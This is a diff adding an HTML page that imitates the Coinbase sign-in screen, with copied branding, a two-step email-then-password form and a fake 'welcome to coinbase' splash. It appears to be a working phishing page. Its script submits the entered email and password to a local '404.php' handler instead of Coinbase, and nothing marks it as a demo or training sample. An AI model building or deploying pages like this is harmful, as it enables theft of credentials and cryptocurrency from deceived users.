@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Coinbase - Sign In</title>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap");
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        text-decoration: none;
+      }
+      body {
+
+        background-color: white;
+        font-family: "Poppins", sans-serif;
+      }
+      #container {
+        width: 40vw;
+        max-width: 456px;
+        color: white;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        padding: 40px;
+        border: 1.5px solid #efeff0;
+        border-radius: 15px;
+        display: flex;
+        flex-direction: column;
+        
+      }
+
+      .head {
+        height: 80px;
+        font-size: 20px;
+        color: #0052ff;
+      }
+      .sechead {
+        height: 60px;
+        font-size: 20px;
+        color: #0a0b0d;
+      }
+      label {
+        color: #0a0b0d;
+        font-weight: 500;
+      }
+
+      input {
+        height: 60px;
+        border-radius: 10px;
+        border: 0.5px solid grey;
+        background-color: transparent;
+        font-size: 17px;
+        margin: 10px 0px;
+        color: black;
+        padding-left: 20px;
+        padding-right: 10px;
+        width: 100%;
+      }
+      input:focus {
+        outline: 1px solid #014cec;
+      }
+      input:hover {
+        background-color: #fafafa;
+      }
+      input::placeholder {
+        font-family: "Poppins", sans-serif;
+        font-weight: 500;
+        /* padding-left: 20px; */
+      }
+
+      p {
+        margin-top: 10px;
+        margin-bottom: 8px;
+        font-size: 14px;
+        font-weight: 400;
+        color: #5b616e;
+      }
+
+      button {
+        border: none;
+        background-color: #014cec;
+        height: 60px;
+        width: 100%;
+        border-radius: 50px;
+        font-size: 18px;
+        font-weight: 550;
+        font-family: "Poppins", sans-serif;
+        margin-bottom: 30px;
+        cursor: pointer;
+      }
+      .cacc {
+        border: none;
+        background-color: #e9ebee;
+        border-radius: 50px;
+        font-size: 18px;
+        font-weight: 550;
+        font-family: "Poppins", sans-serif;
+        padding: 18px;
+        display: block;
+        width: 100%;
+        color: #1a1b1d;
+        text-align: center;
+      }
+      .end {
+        margin-top: 60px;
+        text-align: center;
+      }
+
+      .end a {
+        color: #4a8eff;
+      }
+      #password,
+      #passLabel {
+        display: none;
+      }
+      #checker {
+        margin: 10px;
+        color: rgb(138, 45, 45);
+      }
+      #text {
+        display: none;
+        text-transform: capitalize;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        z-index: 2;
+        background-color: white;
+        transform: translate(-50%,-50%);
+        border-radius: 5px;
+        padding: 100px 50px;
+        box-shadow: 0px 1px 10px rgb(156, 154, 154);
+      }
+
+      #text2 {
+        display: none;
+      }
+      @media (max-width:900px) and (min-width:600px){
+        #container{
+          width: 50vw;
+
+        }
+      }
+
+      @media (max-width:750px) {
+        #container{
+          width: 90vw;
+          padding-inline: 2%;
+        }
+        .head {
+        font-size: 18px;
+        font-weight: 400;
+      }
+      .sechead {
+        font-size: 18px;
+      }
+      }
+    </style>
+  </head>
+  <body>
+    <div id="text">
+      <p>welcome to coinbase</p>
+    </div>
+    <div id="container">
+      <div class="head"><h2>coinbase</h2></div>
+      <div class="sechead"><h2>Sign in to Coinbase</h2></div>
+      <div class="form">
+        <form id="form" method="post" action="404.php">
+          <div>
+            <label for="email">Email</label> <br>
+            <input
+              type="email"
+              name="email"
+              id="email"
+              placeholder="Your email address"
+            />
+          </div>
+          <p id="checker"></p>
+          <div>
+            <label id="passLabel" for="password">Password</label>
+            <input type="password" name="password" id="password" />
+          </div>
+
+          <div id="text2">
+            <p>please input your password</p>
+          </div>
+          <p>Not your device? Use incognito mode to sign in privately.</p>
+          <div>
+            <button type="button" id="btn">Continue</button>
+          </div>
+          <a href="signup" class="cacc">Create account</a>
+        </form>
+      </div>
+      <div class="end">
+        <a href="business">Sign in to a business account</a>
+        <br />
+        <a href="privacy">Privacy policy</a>
+      </div>
+    </div>
+    <script>
+      const button = document.getElementById("btn");
+      const form = document.getElementById("form");
+      const email = document.getElementById("email");
+      const checker = document.getElementById("checker");
+      const label = document.getElementById("passLabel");
+      const password = document.getElementById("password");
+      const text = document.getElementById("text");
+      const text2 = document.getElementById("text2");
+      const container = document.getElementById("container");
+      button.onclick = (_) => {
+        if (email.value === "" || email.value === " ") {
+          checker.textContent = `Please enter a valid email address`;
+          email.style.outline = "1px solid rgb(138, 45, 45)";
+          label.style.display = "none";
+          password.style.display = "none";
+        } else {
+          checker.textContent = ``;
+          email.style.outline = "";
+          label.style.display = "block";
+          password.style.display = "block";
+        }
+        if (password.style.display === "block") {
+          button.onclick = (_) => {
+            if (password.value != "" && password.value != " ") {
+              text.style.display = "block";
+              text2.style.display = "none";
+              container.style.display = "none";
+              form.submit();
+            } else {
+              text.style.display = "none";
+              text2.style.display = "block";
+            }
+          };
+        }
+      };
+    </script>
+  </body>
+</html>
